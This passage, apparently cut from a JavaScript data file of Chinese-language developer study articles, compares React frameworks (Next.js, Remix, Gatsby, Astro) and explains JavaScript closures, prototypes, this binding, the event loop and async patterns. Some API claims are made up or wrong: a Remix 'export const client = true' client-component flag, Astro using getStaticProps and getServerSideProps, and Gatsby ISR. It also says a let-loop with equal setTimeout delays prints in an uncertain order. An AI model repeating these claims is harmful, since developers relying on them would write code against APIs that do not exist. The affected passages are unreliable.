- 强大的生态系统

**Remix：**
- React 团队成员开发：Remix是React Router团队成员开发的全栈React框架，强调Web标准、渐进增强和更好的用户体验，提供了嵌套路由、数据加载、错误处理等完整解决方案，Remix的loader和action模式简化了服务端和客户端的数据交互，是现代React全栈开发的有力选择
- 基于 Web Fetch API
- 嵌套路由和数据加载
- 注重用户体验

**Gatsby：**
- 静态站点生成器
- 基于 GraphQL
- 丰富的插件生态
- 适合内容驱动的网站

**Astro：**
- 多框架支持
- 部分水合技术
- 极致的性能优化
- 适合内容网站

### 核心特性对比

**路由系统：**
- Next.js：基于文件系统的路由
- Remix：嵌套路由，支持布局：Remix使用嵌套路由组织页面结构，子路由可以在父路由的Outlet中渲染，支持布局嵌套和共享，支持loader函数进行服务端数据加载，action函数处理表单提交，提供了良好的数据加载和用户体验，是现代全栈React框架的热门选择
- Gatsby：基于文件系统，支持客户端路由：Gatsby是基于React的静态站点生成器，使用GraphQL查询数据，支持从多种数据源（文件系统、CMS、API）获取数据构建静态网站，提供了丰富的插件生态系统，适合构建博客、文档站点、营销页面等内容驱动型网站，生成的静态页面加载速度极快
- Astro：基于文件系统，支持页面组件：Astro是现代静态站点生成器，支持使用React、Vue、Svelte等组件框架编写页面，Astro的独特之处在于默认使用零JavaScript渲染（Islands Architecture），只在需要交互的部分加载JavaScript，提供了极佳的首屏性能，适合内容丰富但交互较少的网站

**数据获取：**
- Next.js：getStaticProps、getServerSideProps、getStaticPaths
- Remix：loader 函数，嵌套数据加载：Remix使用loader函数在服务器端加载数据，loader函数在每个路由组件中定义，可以访问请求对象、数据库、API等，Remix支持嵌套路由的嵌套数据加载，父路由和子路由的loader可以并行执行，数据加载完成后才会渲染组件，这种设计确保了组件渲染时数据已经准备好，避免了loading状态，提供了更好的用户体验
- Gatsby：GraphQL 数据源：Gatsby使用GraphQL作为数据查询语言，可以从各种数据源（Markdown文件、CMS、API、数据库等）获取数据，Gatsby在构建时执行GraphQL查询，生成静态HTML和JSON数据文件，Gatsby的GraphQL查询在组件中定义，可以精确指定需要的数据，Gatsby还提供GraphiQL交互式查询编辑器，帮助开发者编写和调试GraphQL查询
- Astro：getStaticPaths、getStaticProps：Astro使用getStaticPaths和getStaticProps函数进行静态生成，getStaticPaths用于定义动态路由的所有可能路径，返回一个包含params和props的数组，getStaticProps用于获取每个路径的数据，Astro在构建时执行这些函数，生成静态HTML文件，Astro还支持getServerSideProps进行服务端渲染，提供灵活的数据获取方式

**渲染模式：**
- Next.js：SSG、SSR、ISR、Client Components
- Remix：SSR、Client Components：Remix默认使用服务端渲染（SSR），在服务器端渲染HTML并返回给客户端，Remix也支持客户端组件（Client Components），通过export const client = true标记组件为客户端组件，客户端组件会在浏览器中执行，可以处理用户交互和状态，Remix的SSR和客户端组件结合使用，既保证了SEO和首屏性能，又提供了良好的交互体验
- Gatsby：SSG、Client Components：Gatsby专注于静态站点生成（SSG），在构建时生成所有页面的HTML文件，Gatsby也支持客户端组件，通过React的useEffect和useState等Hook实现客户端交互，Gatsby的SSG提供了极佳的SEO和首屏性能，客户端组件提供了丰富的交互体验，Gatsby还支持增量静态再生成（ISR），可以在构建后更新特定页面
- Astro：SSG、部分水合

### 选择原则

**项目类型：**
- 企业应用：Next.js 或 Remix
- 内容网站：Gatsby 或 Astro
- 性能要求高：Astro
- 功能丰富：Next.js

**团队熟悉度：**
- 团队熟悉 React：Next.js
- 团队熟悉 Node.js：Remix
- 团队熟悉 GraphQL：Gatsby

**部署环境：**
- Vercel：Next.js 最佳：Vercel是Next.js的官方部署平台，提供零配置的部署体验，Vercel自动优化Next.js应用，包括图片优化、字体优化、边缘函数等，Vercel支持预览部署、回滚、A/B测试等高级功能，Vercel的全球CDN网络确保了快速的内容分发，是Next.js项目的最佳部署选择
- 其他云平台：Next.js、Remix
- 静态托管：Gatsby、Astro

### 最佳实践

**项目结构：**
- 遵循框架的约定
- 合理组织文件和组件
- 保持代码清晰

**性能优化：**
- 利用框架的优化特性
- 代码分割和懒加载
- 合理使用缓存

**开发体验：**
- 使用框架的开发工具
- 配置 ESLint 和 Prettier
- 自动化测试

**部署策略：**
- 选择合适的托管平台
- 配置 CI/CD 流程
- 监控应用性能`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-fundamentals",title:"JavaScript 核心概念与执行机制",category:"javascript",difficulty:"medium",tags:["JavaScript","执行上下文","闭包","原型链"],content:`## JavaScript 核心概念与执行机制

JavaScript 是一门单线程、非阻塞、异步的脚本语言，理解其核心概念和执行机制对于编写高质量的代码至关重要。

### 🔄 执行上下文

**执行上下文的类型：**
- **全局执行上下文：代码开始执行时创建**：全局执行上下文是JavaScript代码开始执行时创建的第一个执行上下文，在浏览器环境中全局执行上下文的this指向window对象，在Node.js环境中指向global对象，全局执行上下文包含全局变量、全局函数、this绑定、变量环境、词法环境等，全局执行上下文在页面关闭或程序结束时销毁
- **函数执行上下文：函数被调用时创建**：函数执行上下文是函数被调用时创建的执行上下文，每个函数调用都会创建一个新的执行上下文，函数执行上下文包含函数的参数、局部变量、this绑定、变量环境、词法环境、外部环境引用（outer）等，函数执行上下文在函数执行完毕后销毁，但闭包会保持对外部环境的引用
- **eval 执行上下文：eval 函数执行时创建**：eval执行上下文是eval函数执行时创建的执行上下文，eval函数可以动态执行字符串形式的JavaScript代码，eval执行上下文可以访问调用eval函数的作用域，eval函数的使用会影响性能和安全性，不推荐在生产代码中使用eval函数，可以使用Function构造函数或JSON.parse等替代方案

**执行上下文的创建过程：**
1. **创建变量对象 (VO)**
2. **建立作用域链**
3. **确定 this 指向**

**执行上下文栈：**
- **后进先出 (LIFO) 结构**
- **管理函数调用顺序**
- **函数执行完毕后从栈中弹出**

### 💻 代码示例：执行上下文演示

\`\`\`javascript
// 全局执行上下文
var globalVar = 'global';

function outer() {
  // outer 函数执行上下文
  var outerVar = 'outer';
  
  function inner() {
    // inner 函数执行上下文
    var innerVar = 'inner';
    console.log(innerVar); // 'inner'
    console.log(outerVar); // 'outer'
    console.log(globalVar); // 'global'
  }
  
  inner();
}

outer();
\`\`\`

#### 变量提升示例

\`\`\`javascript
// 变量提升
console.log(a); // undefined，不是 ReferenceError
var a = 10;

console.log(b); // ReferenceError
let b = 20;

// 函数提升
console.log(foo); // 函数定义
foo(); // 'foo'

function foo() {
  console.log('foo');
}

console.log(bar); // undefined
bar(); // TypeError: bar is not a function

var bar = function() {
  console.log('bar');
};
\`\`\`

### 闭包

**什么是闭包：**
- 函数能够访问其词法作用域之外的变量
- 即使函数在其词法作用域之外执行

**闭包的应用：**
- 实现私有变量
- 模块化
- 函数柯里化
- 防抖和节流

**闭包的优缺点：**
- 优点：实现数据封装和模块化：闭包的优点是可以实现数据封装和模块化，通过闭包可以创建私有变量和方法，避免全局命名空间污染，闭包可以保存函数的执行上下文，实现数据的持久化，闭包是JavaScript实现模块化、工厂模式、单例模式等设计模式的基础
- 缺点：可能导致内存泄漏：闭包的缺点是可能导致内存泄漏，因为闭包会保持对外部环境的引用，如果闭包被长时间引用，外部环境的变量和函数不会被垃圾回收，导致内存占用增加，在使用闭包时应该注意及时释放闭包引用，避免内存泄漏

### 代码示例

#### 闭包实现私有变量

\`\`\`javascript
function createCounter() {
  let count = 0;
  
  return {
    increment() {
      count++;
      return count;
    },
    decrement() {
      count--;
      return count;
    },
    getCount() {
      return count;
    }
  };
}

const counter = createCounter();
console.log(counter.increment()); // 1
console.log(counter.increment()); // 2
console.log(counter.decrement()); // 1
console.log(counter.getCount()); // 1
// count 变量无法直接访问，实现了私有变量
\`\`\`

#### 闭包实现模块模式

\`\`\`javascript
const Module = (function() {
  let privateVar = 'private';
  
  function privateMethod() {
    console.log('This is a private method');
  }
  
  return {
    publicMethod() {
      console.log('This is a public method');
      privateMethod();
      console.log(privateVar);
    },
    publicVar: 'public'
  };
})();

Module.publicMethod();
// Module.privateMethod(); // ReferenceError
// Module.privateVar; // undefined
\`\`\`

#### 闭包实现防抖

\`\`\`javascript
function debounce(func, wait) {
  let timeout;
  
  return function(...args) {
    const context = this;
    
    clearTimeout(timeout);
    
    timeout = setTimeout(() => {
      func.apply(context, args);
    }, wait);
  };
}

// 使用示例
const handleInput = debounce((e) => {
  console.log('Input:', e.target.value);
}, 300);

document.getElementById('input').addEventListener('input', handleInput);
\`\`\`

#### 闭包实现节流

\`\`\`javascript
function throttle(func, limit) {
  let inThrottle;
  
  return function(...args) {
    const context = this;
    
    if (!inThrottle) {
      func.apply(context, args);
      inThrottle = true;
      
      setTimeout(() => {
        inThrottle = false;
      }, limit);
    }
  };
}

// 使用示例
const handleScroll = throttle(() => {
  console.log('Scrolling...');
}, 100);

window.addEventListener('scroll', handleScroll);
\`\`\`

### 原型链

**原型链的概念：**
- JavaScript 中对象通过原型链继承属性和方法：JavaScript使用原型继承机制，每个对象都有一个内部属性[[Prototype]]指向其原型对象，当访问对象的属性或方法时，如果对象本身没有该属性，JavaScript会沿着原型链向上查找直到找到为止或返回undefined，原型链的顶端是Object.prototype，这种继承方式称为原型继承，是JavaScript面向对象编程的基础
- 每个对象都有一个原型对象
- 原型对象也是对象，也有自己的原型
- 直到 null

**原型链的工作原理：**
- 当访问对象的属性时，会先在对象自身查找
- 如果找不到，会沿着原型链向上查找
- 直到找到或到达原型链末端

### 代码示例

#### 原型链示例

\`\`\`javascript
function Person(name) {
  this.name = name;
}

Person.prototype.sayHello = function() {
  console.log(\`Hello, my name is \${this.name}\`);
};

const person = new Person('Alice');
person.sayHello(); // 'Hello, my name is Alice'

console.log(person.__proto__ === Person.prototype); // true
console.log(Person.prototype.__proto__ === Object.prototype); // true
console.log(Object.prototype.__proto__ === null); // true
\`\`\`

#### 原型继承

\`\`\`javascript
function Animal(name) {
  this.name = name;
}

Animal.prototype.eat = function() {
  console.log(\`\${this.name} is eating\`);
};

function Dog(name, breed) {
  Animal.call(this, name);
  this.breed = breed;
}

// 设置原型链
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog;

Dog.prototype.bark = function() {
  console.log(\`\${this.name} is barking\`);
};

const dog = new Dog('Buddy', 'Golden Retriever');
dog.eat(); // 'Buddy is eating'
dog.bark(); // 'Buddy is barking'
\`\`\`

#### ES6 类继承

\`\`\`javascript
class Animal {
  constructor(name) {
    this.name = name;
  }
  
  eat() {
    console.log(\`\${this.name} is eating\`);
  }
}

class Dog extends Animal {
  constructor(name, breed) {
    super(name);
    this.breed = breed;
  }
  
  bark() {
    console.log(\`\${this.name} is barking\`);
  }
}

const dog = new Dog('Buddy', 'Golden Retriever');
dog.eat(); // 'Buddy is eating'
dog.bark(); // 'Buddy is barking'
\`\`\`

### this 指向

**this 的绑定规则：**
- 默认绑定：全局对象或 undefined（严格模式）：默认绑定是this绑定的默认规则，当函数独立调用时（不作为对象方法、不使用call/apply/bind、不使用new），this指向全局对象（浏览器中的window，Node.js中的global），在严格模式下this指向undefined，默认绑定是this绑定中最常见的情况
- 隐式绑定：调用对象：隐式绑定是this绑定的规则之一，当函数作为对象的方法调用时，this指向调用该函数的对象，隐式绑定依赖于函数的调用方式，如果函数被赋值给其他变量或作为回调函数传递，隐式绑定会丢失，需要使用显式绑定或箭头函数保持this绑定
- 显式绑定：call、apply、bind：显式绑定是通过call、apply、bind方法强制指定函数的this绑定，call和apply方法立即调用函数，call方法接收参数列表，apply方法接收参数数组，bind方法返回一个新函数，新函数的this被永久绑定到指定的对象，显式绑定可以解决隐式绑定丢失的问题
- new 绑定：新创建的对象：new绑定是使用new关键字调用构造函数时的this绑定规则，this指向新创建的对象，new绑定会创建一个新对象，将构造函数的prototype属性赋值给新对象的[[Prototype]]属性，执行构造函数，如果构造函数没有返回对象则返回新对象，new绑定是创建对象实例的基础
- 箭头函数：词法作用域的 this：箭头函数没有自己的this绑定，this继承自外层作用域，箭头函数的this在函数定义时就确定，而不是在调用时确定，箭头函数不能作为构造函数使用，不能使用call、apply、bind改变this绑定，箭头函数适合用于回调函数、事件处理函数等需要保持this绑定的场景

### 深入理解

#### 变量提升的详细机制

**变量提升的本质：**
- JavaScript 引擎在代码执行前进行编译：JavaScript引擎在执行代码前会先进行编译，编译阶段会进行词法分析生成抽象语法树（AST），进行作用域分析确定变量和函数的声明位置，进行代码优化生成字节码，编译完成后进入执行阶段，执行阶段会创建执行上下文，逐行解释执行字节码，了解编译过程有助于理解变量提升、闭包等核心概念
- 函数声明和变量声明被提升到作用域顶部
- 函数声明优先于变量声明
- let 和 const 也有提升，但存在暂时性死区

**暂时性死区（TDZ）：**
- let 和 const 变量在声明前无法访问
- 从作用域开始到变量声明之间的区域
- 避免在声明前使用变量

#### 作用域链的查找过程

**查找顺序：**
1. 在当前作用域中查找变量
2. 如果未找到，向上一级作用域查找
3. 重复步骤1-2，直到全局作用域
4. 如果全局作用域也未找到，抛出 ReferenceError

**词法作用域 vs 动态作用域：**
- JavaScript 使用词法作用域（静态作用域）：词法作用域是指变量的作用域在代码编写时就确定了，而不是在运行时确定，函数定义时决定了其可以访问哪些变量，嵌套函数可以访问外层函数的变量，这种作用域模型使得代码分析更简单，也是闭包能够工作的基础，与之相对的是动态作用域（如bash脚本使用）
- 作用域在函数定义时确定，而不是调用时
- 与动态作用域（如某些语言中的 eval）不同

#### 闭包的内存管理

**闭包的内存占用：**
- 闭包会保持对外部变量的引用
- 这些变量不会被垃圾回收
- 长期存在的闭包可能导致内存泄漏

**避免内存泄漏的方法：**
- 及时释放闭包引用
- 避免在循环中创建大量闭包
- 使用弱引用（WeakMap、WeakSet）
- 在不需要时手动解除引用

#### 原型链的查找优化

**原型链查找的性能：**
- 原型链查找是动态的，每次访问属性都需要查找
- 深层原型链查找可能影响性能
- 可以通过缓存属性值来优化

**优化策略：**
- 将常用属性直接定义在对象上
- 避免过深的原型链
- 使用 Object.create(null) 创建无原型对象

#### this 绑定的优先级

**绑定优先级（从高到低）：**
1. new 绑定
2. 显式绑定（bind > call/apply）
3. 隐式绑定
4. 默认绑定

**特殊情况：**
- 箭头函数的 this 继承自外层作用域
- DOM 事件处理函数中的 this 指向事件目标：在DOM事件处理函数中，this关键字指向触发事件的DOM元素（event.currentTarget），可以通过this访问元素的属性和方法，如this.value、this.style等，这种行为与普通函数中的this不同，事件处理函数中的this绑定是JavaScript事件系统自动处理的
- setTimeout/setInterval 中的 this 指向全局对象

#### 事件循环的深入理解

**事件循环的组成部分：**
- 调用栈（Call Stack）
- 任务队列（Task Queue）
- 微任务队列（Microtask Queue）
- Web APIs（定时器、DOM 事件等）：Web APIs是浏览器提供的JavaScript接口，用于与浏览器环境交互，包括setTimeout/setInterval定时器API、DOM操作API、fetch网络请求API、Storage存储API、Canvas绘图API等，这些API大多是异步的， callback会被添加到任务队列中等待执行，是JavaScript实现异步编程的重要基础

**浏览器环境 vs Node.js 环境：**
- 浏览器：宏任务包括 setTimeout、setInterval、UI 渲染
- Node.js：宏任务包括 setTimeout、setInterval、I/O 操作：Node.js的事件循环与浏览器有所不同，宏任务包括setTimeout、setInterval、setImmediate、I/O操作（文件读写、网络请求等），微任务包括Promise回调、process.nextTick（优先级最高），Node.js的事件循环有多个阶段如timers、pending callbacks、idle/prepare、poll、check等，了解Node.js事件循环对编写高效的Node.js应用很重要
- 微任务在两者中基本相同

**性能优化：**
- 避免长时间运行的同步代码
- 合理使用 requestAnimationFrame
- 将大任务拆分为小任务
- 使用 Web Worker 处理 CPU 密集型任务

### 实战应用

#### 模块化实现

\`\`\`javascript
// 使用闭包实现模块
const myModule = (function() {
  // 私有变量和方法
  let privateVar = 0;
  
  function privateMethod() {
    return privateVar * 2;
  }
  
  // 公共 API
  return {
    increment() {
      privateVar++;
      console.log('Incremented:', privateVar);
    },
    decrement() {
      privateVar--;
      console.log('Decremented:', privateVar);
    },
    getValue() {
      return privateMethod();
    }
  };
})();

// 使用模块
myModule.increment(); // Incremented: 1
myModule.increment(); // Incremented: 2
console.log(myModule.getValue()); // 4
myModule.decrement(); // Decremented: 1
\`\`\`

#### 函数柯里化

\`\`\`javascript
// 柯里化函数
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    } else {
      return function(...moreArgs) {
        return curried.apply(this, args.concat(moreArgs));
      };
    }
  };
}

// 使用柯里化
function add(a, b, c) {
  return a + b + c;
}

const curriedAdd = curry(add);
console.log(curriedAdd(1)(2)(3)); // 6
console.log(curriedAdd(1, 2)(3)); // 6
console.log(curriedAdd(1, 2, 3)); // 6

// 实际应用：创建可复用的函数
const multiply = (a, b) => a * b;
const double = curry(multiply)(2);
console.log(double(5)); // 10
console.log(double(10)); // 20
\`\`\`

#### 高阶函数

\`\`\`javascript
// 高阶函数：接受函数作为参数或返回函数
function withLogging(fn) {
  return function(...args) {
    console.log('Calling function with args:', args);
    const result = fn.apply(this, args);
    console.log('Function returned:', result);
    return result;
  };
}

// 使用高阶函数
function add(a, b) {
  return a + b;
}

const loggedAdd = withLogging(add);
loggedAdd(3, 4); // Calling function with args: [3, 4] // Function returned: 7

// 实际应用：权限检查
function withAuth(fn) {
  return function(...args) {
    if (!isAuthenticated()) {
      throw new Error('Not authenticated');
    }
    return fn.apply(this, args);
  };
}

function deleteUser(userId) {
  // 删除用户逻辑
  console.log('Deleting user:', userId);
}

const protectedDeleteUser = withAuth(deleteUser);
\`\`\`

#### 性能优化示例

\`\`\`javascript
// 使用闭包缓存计算结果
function memoize(fn) {
  const cache = new Map();
  
  return function(...args) {
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      console.log('Cache hit:', key);
      return cache.get(key);
    }
    
    const result = fn.apply(this, args);
    cache.set(key, result);
    console.log('Cache miss:', key);
    return result;
  };
}

// 使用记忆化
function fibonacci(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
}

const memoizedFibonacci = memoize(fibonacci);
console.log(memoizedFibonacci(10)); // 大幅提升性能

// 使用节流优化滚动事件
function optimizedScrollHandler() {
  // 节流后的处理逻辑
  console.log('Optimized scroll handler');
}

const throttledScroll = throttle(optimizedScrollHandler, 100);
window.addEventListener('scroll', throttledScroll);
\`\`\`

### 常见陷阱和解决方案

#### 循环中的闭包陷阱

\`\`\`javascript
// 错误示例
for (var i = 0; i < 5; i++) {
  setTimeout(function() {
    console.log(i); // 输出 5, 5, 5, 5, 5
  }, 100);
}

// 解决方案1：使用 let
for (let i = 0; i < 5; i++) {
  setTimeout(function() {
    console.log(i); // 输出 0, 1, 2, 3, 4
  }, 100);
}

// 解决方案2：使用闭包
for (var i = 0; i < 5; i++) {
  (function(j) {
    setTimeout(function() {
      console.log(j); // 输出 0, 1, 2, 3, 4
    }, 100);
  })(i);
}
\`\`\`

#### this 绑定陷阱

\`\`\`javascript
// 陷阱1：方法中的 this
const obj = {
  name: 'Alice',
  getName() {
    console.log(this.name); // 正确
  },
  getArrowName: () => {
    console.log(this.name); // 错误，this 指向全局对象
  }
};

obj.getName(); // 'Alice'
obj.getArrowName(); // undefined

// 解决方案
const obj = {
  name: 'Alice',
  getArrowName() {
    const self = this;
    return () => {
      console.log(self.name); // 正确
    };
  }
};

// 陷阱2：事件处理中的 this
class Button {
  constructor() {
    this.count = 0;
    this.button = document.createElement('button');
    this.button.textContent = 'Click me';
    
    // 错误：this 指向 button 元素
    this.button.addEventListener('click', this.handleClick);
  }
  
  handleClick() {
    this.count++; // 错误：this.count 是 undefined
    console.log('Clicked:', this.count);
  }
}

// 解决方案1：使用 bind
this.button.addEventListener('click', this.handleClick.bind(this));

// 解决方案2：使用箭头函数
this.button.addEventListener('click', () => this.handleClick());
\`\`\`

#### 异步陷阱

\`\`\`javascript
// 陷阱：期望同步执行
console.log('1');
setTimeout(() => console.log('2'), 0);
console.log('3');
// 输出：1, 3, 2

// 陷阱：循环中的异步操作
for (let i = 0; i < 3; i++) {
  setTimeout(() => {
    console.log(i); // 0, 1, 2（顺序不确定）
  }, 100);
}

// 解决方案：使用 async/await 确保顺序
async function sequentialLoop() {
  for (let i = 0; i < 3; i++) {
    await new Promise(resolve => {
      setTimeout(() => {
        console.log(i);
        resolve();
      }, 100);
    });
  }
}
sequentialLoop(); // 0, 1, 2（按顺序）
\`\`\`

### 代码示例

#### this 绑定规则

\`\`\`javascript
// 默认绑定
function foo() {
  console.log(this); // 全局对象或 undefined（严格模式）
}
foo();

// 隐式绑定
const obj = {
  name: 'Alice',
  foo() {
    console.log(this.name); // 'Alice'
  }
};
obj.foo();

// 显式绑定
function greet() {
  console.log(\`Hello, \${this.name}\`);
}
const person = { name: 'Bob' };
greet.call(person); // 'Hello, Bob'
greet.apply(person); // 'Hello, Bob'
const boundGreet = greet.bind(person);
boundGreet(); // 'Hello, Bob'

// new 绑定
function Person(name) {
  this.name = name;
}
const person = new Person('Charlie');
console.log(person.name); // 'Charlie'

// 箭头函数
const obj = {
  name: 'Alice',
  foo() {
    const arrow = () => {
      console.log(this.name); // 'Alice'
    };
    arrow();
  }
};
obj.foo();
\`\`\`

### 事件循环

**事件循环的概念：**
- JavaScript 执行机制的核心：事件循环（Event Loop）是JavaScript执行机制的核心，通过不断从任务队列中取出任务执行来驱动JavaScript程序的运行，事件循环会优先执行微任务队列中的所有任务，然后再执行宏任务队列中的一个任务，这种执行顺序确保了Promise等微任务能够快速响应，是理解JavaScript异步编程的关键
- 处理异步操作
- 由主线程、宏任务队列和微任务队列组成

**执行过程：**
1. 执行主线程代码
2. 执行微任务队列中的所有任务
3. 执行宏任务队列中的一个任务
4. 重复步骤 2-3

**宏任务和微任务：**
- 宏任务：setTimeout、setInterval、I/O 操作
- 微任务：Promise、async/await、process.nextTick

### 代码示例

#### 事件循环示例

\`\`\`javascript
console.log('1');

setTimeout(() => {
  console.log('2');
}, 0);

Promise.resolve().then(() => {
  console.log('3');
});

console.log('4');

// 输出顺序：1, 4, 3, 2
\`\`\`

#### 复杂事件循环

\`\`\`javascript
console.log('1');

setTimeout(() => {
  console.log('2');
  Promise.resolve().then(() => {
    console.log('3');
  });
}, 0);

Promise.resolve().then(() => {
  console.log('4');
  setTimeout(() => {
    console.log('5');
  }, 0);
});

console.log('6');

// 输出顺序：1, 6, 4, 2, 3, 5
\`\`\`

### 最佳实践

- 理解执行上下文和作用域
- 合理使用闭包，避免内存泄漏
- 理解原型链和继承
- 正确处理 this 指向
- 掌握异步编程模式
- 编写清晰、可维护的代码

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-async",title:"JavaScript 异步编程模式",category:"javascript",difficulty:"medium",tags:["JavaScript","异步","Promise","async/await"],content:`## JavaScript 异步编程模式

JavaScript 是一门单线程语言，异步编程是其核心特性之一，掌握各种异步编程模式对于编写高性能的应用至关重要。

### 回调函数

**回调函数的概念：**
- 作为参数传递给其他函数的函数
- 在异步操作完成后被调用

**回调地狱：**
- 嵌套的回调函数
- 代码难以阅读和维护
- 错误处理复杂

### 代码示例

#### 回调函数示例

\`\`\`javascript
// 基本回调函数
function fetchData(callback) {
  setTimeout(() => {
    const data = { name: 'Alice', age: 25 };
    callback(null, data);
  }, 1000);
}

fetchData((error, data) => {
  if (error) {
    console.error('Error:', error);
    return;
  }
  console.log('Data:', data);
});

// 回调地狱
fetchData((error, data) => {
  if (error) {
    console.error('Error:', error);
    return;
  }
  
  processData(data, (error, processedData) => {
    if (error) {
      console.error('Error:', error);
      return;
    }
    
    saveData(processedData, (error, result) => {
      if (error) {
        console.error('Error:', error);
        return;
      }
      
      console.log('Result:', result);
    });
  });
});
\`\`\`

### Promise

**Promise 的概念：**
- 表示一个异步操作的最终完成或失败
- 有三种状态：pending、fulfilled、rejected
- 状态一旦改变就不会再变

**Promise 的方法：**
- then()：处理成功的结果
- catch()：处理错误
- finally()：无论成功或失败都会执行
- all()：等待所有 Promise 完成
- race()：等待第一个 Promise 完成
- allSettled()：等待所有 Promise 完成或失败
- any()：等待第一个成功的 Promise

### 代码示例

#### Promise 基础示例

\`\`\`javascript
// 创建 Promise
const promise = new Promise((resolve, reject) => {
  setTimeout(() => {
    const success = Math.random() > 0.5;
    
    if (success) {
      resolve({ name: 'Alice', age: 25 });
    } else {
      reject(new Error('Failed to fetch data'));
    }
  }, 1000);
});

// 使用 Promise
promise
  .then(data => {
    console.log('Data:', data);
    return data;
  })
  .catch(error => {
    console.error('Error:', error);
  })
  .finally(() => {
    console.log('Operation completed');
  });
\`\`\`

#### Promise 链式调用

\`\`\`javascript
function fetchData() {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ name: 'Alice', age: 25 });
    }, 1000);
  });
}

function processData(data) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ ...data, processed: true });
    }, 500);
  });
}

function saveData(data) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ success: true, data });
    }, 300);
  });
}

// 链式调用
fetchData()
  .then(data => {
    console.log('Fetched:', data);
    return processData(data);
  })
  .then(data => {
    console.log('Processed:', data);
    return saveData(data);
  })
  .then(result => {
    console.log('Saved:', result);
  })
  .catch(error => {
    console.error('Error:', error);
  });
\`\`\`

#### Promise.all 并发执行

\`\`\`javascript
function fetchUser(id) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ id, name: \`User \${id}\` });
    }, 1000);
  });
}

function fetchPosts(userId) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve([
        { id: 1, userId, title: 'Post 1' },
        { id: 2, userId, title: 'Post 2' }
      ]);
    }, 800);
  });
}

function fetchComments(postId) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve([
        { id: 1, postId, text: 'Comment 1' },
        { id: 2, postId, text: 'Comment 2' }
      ]);
    }, 600);
  });
}

// 并发执行
Promise.all([
  fetchUser(1),
  fetchPosts(1),
  fetchComments(1)
])
  .then(([user, posts, comments]) => {
    console.log('User:', user);
    console.log('Posts:', posts);
    console.log('Comments:', comments);
  })
  .catch(error => {
    console.error('Error:', error);
  });
\`\`\`

#### Promise.race 超时处理

\`\`\`javascript
function fetchData() {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ data: 'Some data' });
    }, 2000);
  });
}

function timeout(ms) {
  return new Promise((_, reject) => {
    setTimeout(() => {
      reject(new Error('Timeout'));
    }, ms);
  });
}

// 使用 Promise.race 实现超时
Promise.race([
  fetchData(),
  timeout(1000)
])
  .then(data => {
    console.log('Data:', data);
  })
  .catch(error => {
    console.error('Error:', error.message);
  });
\`\`\`

#### Promise.allSettled 等待所有完成

\`\`\`javascript
const promises = [
  Promise.resolve(1),
  Promise.reject(new Error('Failed')),
  Promise.resolve(3)
];

Promise.allSettled(promises)
  .then(results => {
    results.forEach((result, index) => {
      if (result.status === 'fulfilled') {
        console.log(\`Promise \${index}: \${result.value}\`);
      } else {
        console.log(\`Promise \${index}: \${result.reason.message}\`);
      }
    });
  });
\`\`\`

### async/await

**async/await 的概念：**
- 基于 Promise 的语法糖
- 使异步代码看起来像同步代码
- 更易于阅读和维护

**使用方法：**
- async 函数返回一个 Promise
- await 关键字只能在 async 函数中使用
- await 会暂停函数执行，直到 Promise 解决

### 代码示例

#### async/await 基础示例

\`\`\`javascript
async function fetchData() {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ name: 'Alice', age: 25 });
    }, 1000);
  });
}

async function main() {
  try {
    const data = await fetchData();
    console.log('Data:', data);
  } catch (error) {
    console.error('Error:', error);
  }
}

main();
\`\`\`

#### async/await 错误处理

\`\`\`javascript
async function fetchUser(id) {
  const response = await fetch(\`/api/users/\${id}\`);
  
  if (!response.ok) {
    throw new Error(\`HTTP error! status: \${response.status}\`);
  }
  
  return response.json();
}

async function main() {
  try {
    const user = await fetchUser(1);
    console.log('User:', user);
  } catch (error) {
    console.error('Failed to fetch user:', error.message);
  }
}

main();
\`\`\`

#### async/await 并发执行

\`\`\`javascript
async function fetchUser(id) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ id, name: \`User \${id}\` });
    }, 1000);
  });
}

async function fetchPosts(userId) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve([
        { id: 1, userId, title: 'Post 1' },
        { id: 2, userId, title: 'Post 2' }
      ]);
    }, 800);
  });
}

async function fetchComments(postId) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve([
        { id: 1, postId, text: 'Comment 1' },
        { id: 2, postId, text: 'Comment 2' }
      ]);
    }, 600);
  });
}

// 并发执行
async function main() {
  try {
    const [user, posts, comments] = await Promise.all([
      fetchUser(1),
      fetchPosts(1),
      fetchComments(1)
    ]);
    
    console.log('User:', user);
    console.log('Posts:', posts);
    console.log('Comments:', comments);
  } catch (error) {
    console.error('Error:', error);
  }
}

main();
\`\`\`

#### async/await 顺序执行

\`\`\`javascript
async function fetchUser(id) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ id, name: \`User \${id}\` });
    }, 1000);
  });
}

async function fetchPosts(userId) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve([
        { id: 1, userId, title: 'Post 1' }
      ]);
    }, 800);
  });
}

// 顺序执行
async function main() {
  try {
    const user = await fetchUser(1);
    console.log('User:', user);
    
    const posts = await fetchPosts(user.id);
    console.log('Posts:', posts);
  } catch (error) {
    console.error('Error:', error);
  }
}

main();
\`\`\`

### 异步模式最佳实践

**错误处理：**
- 使用 try/catch 处理 async/await 错误
- 使用 catch() 处理 Promise 错误
- 统一错误处理策略

**并发控制：**
- 使用 Promise.all() 并行处理多个异步操作
- 使用 Promise.race() 处理超时
- 合理控制并发数量

**性能优化：**
- 避免不必要的异步操作
- 使用缓存减少重复请求
- 合理使用防抖和节流

### 代码示例

#### 并发控制

\`\`\`javascript
async function fetchUrl(url) {
  const response = await fetch(url);
  return response.json();
}

async function fetchAll(urls, concurrency = 3) {
  const results = [];
  const executing = [];
  
  for (const url of urls) {
